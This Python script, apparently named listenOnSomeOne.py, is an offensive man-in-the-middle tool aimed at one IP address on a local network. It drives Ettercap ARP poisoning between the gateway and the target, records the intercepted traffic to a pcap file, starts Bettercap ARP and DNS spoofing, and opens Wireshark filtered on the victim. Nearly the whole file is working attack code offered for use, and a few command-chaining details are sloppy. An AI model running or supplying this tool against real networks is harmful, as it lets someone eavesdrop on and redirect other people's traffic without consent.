
import asyncio
import os
import re
import subprocess
import sys
from colorama import Fore
import pyfiglet
from termcolor import colored
import random
import ipaddress
import psutil
import socket

def create_ascii_text():
    font_list = pyfiglet.FigletFont.getFonts()
    color_list = ['red', 'green', 'yellow', 'blue', 'magenta', 'cyan', 'white']
    default_text = "Keep Threats Outside"
    os.system("clear")
    font_choice = random.choice(font_list)
    color_choice = random.choice(color_list)
    ASCII_art_1 = pyfiglet.figlet_format(default_text, font=font_choice)
    print(colored(ASCII_art_1, color_choice))
    copy_right = colored("author cyb2rS2c", 'red')
    print(copy_right)

def is_valid_ipv4(ip):
    try:
        ipaddress.IPv4Address(ip)
        return True
    except Exception:
        return False

def is_valid_iface(iface):
    return iface in psutil.net_if_addrs().keys()

async def get_network_info(interface):
    try:
        process = await asyncio.create_subprocess_exec('ip', 'route', stdout=asyncio.subprocess.PIPE)
        stdout, _ = await process.communicate()
        route_output = stdout.decode()
        gateway_match = re.search(r'default via (\S+)', route_output)
        default_gateway = gateway_match.group(1) if gateway_match else None
        process = await asyncio.create_subprocess_exec('ip', 'addr', 'show', interface, stdout=asyncio.subprocess.PIPE)
        stdout, _ = await process.communicate()
        ip_output = stdout.decode()
        ip_match = re.search(r'inet (\S+)', ip_output)
        ip_address = ip_match.group(1) if ip_match else None
        return default_gateway, ip_address
    except Exception as e:
        print(Fore.RED + f"Network info error: {e}")
        return None, None

def create_excluded_ips_for_target(target_ip):
    try:
        subnet = ipaddress.ip_network(f"{target_ip}/24", strict=False)
    except Exception:
        return []
    denied = [str(ip) for ip in subnet.hosts() if str(ip) != target_ip]
    return denied

def create_excluded_ips_file(filter_file, exclude_ips):
    try:
        with open(filter_file, 'w') as f:
            for ip in exclude_ips:
                f.write(f"if (ip.src == '{ip}' || ip.dst == '{ip}') {{\n")
                f.write(f"    drop();\n")
                f.write(f"}}\n")
        print(Fore.GREEN + f"Created filter file '{filter_file}' with excluded IPs.")
    except Exception as e:
        print(Fore.RED + f"Error creating filter file: {e}")

async def compile_filter_file(filter_file, interface):
    if not os.path.isfile(filter_file):
        print(Fore.RED + f"Error: '{filter_file}' does not exist.")
        return None
    compiled_file = filter_file.replace('.ef', '.efc')
    compile_command = ['etterfilter', filter_file, '-o', compiled_file]
    print(Fore.CYAN + f"Compiling filter file using interface: {interface}")
    try:
        compile_process = await asyncio.create_subprocess_exec(
            *compile_command,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        await compile_process.communicate()
        return compiled_file
    except Exception as e:
        print(Fore.RED + f"Filter compile error: {e}")
        return None

async def run_ettercap(interface, default_gateway, target_ip, filter_file):
    compiled_file = await compile_filter_file(filter_file, interface)
    if not compiled_file:
        print(Fore.RED + "Failed to compile the filter file. Aborting Ettercap run.")
        return
    pcap_file = f"{target_ip}_filtered_activity.pcap"
    ettercap_command = [
        'ettercap', '-T', '-S', '-i', interface, '-F', compiled_file,
        '-M', 'arp:remote', f'//{default_gateway}/', f'//{target_ip}/',
        '-w', pcap_file
    ]
    try:
        print(Fore.YELLOW + f"Running Ettercap with command: {' '.join(ettercap_command)}")
        print(Fore.CYAN + 'Wait for packets to appear in Wireshark...')
        print(Fore.MAGENTA + 'Press Ctrl + C to stop Ettercap.')
        gnome_ettercap_command = f'gnome-terminal -- bash -c "ettercap -T -S -i {interface} -F {compiled_file} -M arp:remote //{default_gateway}/ //{target_ip}/ -w {pcap_file}; exec bash"'
        os.system(gnome_ettercap_command)
        ettercap_process = await asyncio.create_subprocess_exec(
            *ettercap_command,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        await ettercap_process.communicate()
    except asyncio.CancelledError:
        print(Fore.YELLOW + f"Ettercap process was cancelled for target: {target_ip}")
        ettercap_process.terminate()
        await ettercap_process.wait()
    except KeyboardInterrupt:
        print(Fore.YELLOW + f"Process interrupted for target: {target_ip}.")
    except Exception as e:
        print(Fore.RED + f"An error occurred while running Ettercap for target {target_ip}: {e}")

async def run_bettercap(interface, target_ip):
    domaintoforward = "unused.com"
    commands = [
        "net.probe on",
        "net.show",
        f"set arp.spoof.targets {target_ip}",
        "net.sniff on",
        "net.sniff off",
        "clear",
        f"set dns.spoof.domains {domaintoforward}",
        "dns.spoof on"
    ]
    terminal_command = [
        'gnome-terminal',
        '--',
        'bash', '-c',
        f"echo 'Starting Bettercap...';bettercap -X -I {interface}; "
        f"{' && '.join(commands)}; exec bash"
    ]
    try:
        process = subprocess.Popen(terminal_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        process.communicate()
        print(Fore.GREEN + "Bettercap running successfully in GNOME Terminal.")
    except Exception as e:
        print(Fore.RED + f"Error running Bettercap in GNOME Terminal: {e}")

def build_wireshark_filter(target_ip, exclude_ips):
    target_ip_filter = f"(ip.src == {target_ip} || ip.dst == {target_ip})"
    exclude_filter = " && ".join([f"!(ip.src == {ip} || ip.dst == {ip})" for ip in exclude_ips])
    filter_parts = [target_ip_filter]
    if exclude_filter: filter_parts.append(f"({exclude_filter})")
    filter_str = " && ".join(filter_parts)
    return filter_str

async def launch_wireshark(interface, target_ip, exclude_ips):
    filter_str = build_wireshark_filter(target_ip, exclude_ips)
    wireshark_command = [
        'gnome-terminal',
        '--',
        'bash', '-c',
        f'wireshark -i {interface} -k -Y \'{filter_str}\''
    ]
    print(Fore.BLUE + f"Launching Wireshark for interface: {interface} (IP: {target_ip}) with filter:\n{filter_str}")
    subprocess.Popen(wireshark_command)

def print_usage():
    print(Fore.CYAN + "\nUsage:")
    print(Fore.YELLOW + "  sudo python3 listenOnSomeOne.py <target_ip> <interface>\n")
    print(Fore.CYAN + "Example:")
    print(Fore.YELLOW + "  sudo python3 listenOnSomeOne.py 192.168.1.100 eth0\n")
    print(Fore.CYAN + "Description:")
    print(Fore.YELLOW + "  Launches Ettercap, Bettercap, and Wireshark for MITM/sniffing, targeting a single IP on the specified interface.\n")
async def main(target_ip, interface, default_gateway, exclude_ips):
    filter_file = "excluded_ips.ef"
    create_excluded_ips_file(filter_file, exclude_ips)
    print("Starting aggressive sniffer + MITM...")
    await asyncio.gather(
        run_ettercap(interface, default_gateway, target_ip, filter_file),
        run_bettercap(interface, target_ip),
        launch_wireshark(interface, target_ip, exclude_ips)
    )

if __name__ == "__main__":
    try:
        create_ascii_text()
        if len(sys.argv) != 3:
            print_usage()
            sys.exit(1)

        target_ip = sys.argv[1]
        interface = sys.argv[2]
        # ... validation ...
        default_gateway, ip_address = asyncio.run(get_network_info(interface))
        if not default_gateway or not ip_address:
            print("Could not find network gateway or IP address on that interface.")
            sys.exit(1)
        exclude_ips = create_excluded_ips_for_target(target_ip)

        asyncio.run(main(target_ip, interface, default_gateway, exclude_ips))

    except KeyboardInterrupt:
        print("\n[!] User interrupted with Ctrl+C. Exiting gracefully.")
    except RuntimeError as e:
        print(f"Error: {e}")
